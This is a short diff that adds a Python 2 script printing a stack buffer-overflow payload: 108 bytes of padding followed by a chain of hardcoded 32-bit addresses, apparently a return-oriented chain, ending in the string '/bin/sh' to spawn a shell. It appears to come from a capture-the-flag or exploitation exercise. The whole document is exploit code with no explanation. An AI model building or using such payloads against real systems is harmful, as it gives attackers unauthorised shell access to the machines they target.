@@ -1,0 +1,2 @@
+from struct import pack
+print '\x01'*108+pack('<I',0xbffea808)+pack('<I',0x0806669a)+pack('<I',0xbffea774)+pack('<I',0x080643e8)+'\x01'*8+pack('<I',0x0808ff7d)+pack('<I',0xbffea874)+'\x01'*8+pack('<I',0xbffea874)+pack('<I',0x08050bbc)+'\x01'*4+(pack('<I',0x41414141)+pack('<I',0x08050bbc))*10+pack('<I',0x41414141)+pack('<I',0x08055d70)+'/bin/sh'
